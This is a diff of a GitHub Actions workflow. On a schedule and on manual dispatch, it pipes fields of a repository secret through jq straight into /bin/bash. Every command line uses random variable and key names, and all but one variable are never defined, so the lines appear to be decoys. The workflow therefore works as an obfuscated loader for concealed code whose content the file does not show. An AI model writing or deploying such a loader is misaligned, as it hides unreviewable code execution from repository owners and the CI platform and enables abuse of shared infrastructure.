@@ -1,34 +1,29 @@
 name: liutang19871010
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 5/6 * * *'
+    - cron: '54 3/6 * * *'
 
-jobs:  # 9706
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: liutang19871010
         env:
-          cx32: ${{ secrets.cx32 }}
+          zq01: ${{ secrets.zq01 }}
         run: |
-          echo $cx32 | jq -r .v9320 | /bin/bash
-          echo $vh7 | jq -r .kj60074 | /bin/bash
-          echo $bkd94428 | jq -r .lojp451 | /bin/bash
-          echo $oyjo2 | jq -r .unub1 | /bin/bash
-          echo $ydwoe33809 | jq -r .aljmt16788 | /bin/bash
-          echo $y79 | jq -r .b23298 | /bin/bash
-          echo $ify7004 | jq -r .xqhr41 | /bin/bash
-          echo $kfd64 | jq -r .zl2017 | /bin/bash
-          echo $gy1 | jq -r .hsgo43 | /bin/bash
-          echo $gad7994 | jq -r .lmppn595 | /bin/bash
-          echo $fo96565 | jq -r .v68 | /bin/bash
-          echo $tnanp266 | jq -r .ffzj3 | /bin/bash
-          echo $z0326 | jq -r .pc065 | /bin/bash
-          echo $y4659 | jq -r .bkhly6 | /bin/bash
-          echo $zn25 | jq -r .rueri5611 | /bin/bash
-          echo $ub75663 | jq -r .f9 | /bin/bash
-          echo $mr5620 | jq -r .tk589 | /bin/bash
+          echo $zq01 | jq -r .qs98 | /bin/bash
+          echo $jqgwq781 | jq -r .di37676 | /bin/bash
+          echo $vb23712 | jq -r .avutx0108 | /bin/bash
+          echo $pz98324 | jq -r .yzyt1 | /bin/bash
+          echo $sy59195 | jq -r .knl4 | /bin/bash
+          echo $n398 | jq -r .dufxq896 | /bin/bash
+          echo $dc89211 | jq -r .qoyct734 | /bin/bash
+          echo $tje56 | jq -r .uf70025 | /bin/bash
+          echo $econ2 | jq -r .gvze48 | /bin/bash
+          echo $mpxjt620 | jq -r .q677 | /bin/bash
+          echo $xzfg68369 | jq -r .dvexp2 | /bin/bash
+          echo $sl96 | jq -r .zdxk57284 | /bin/bash
 
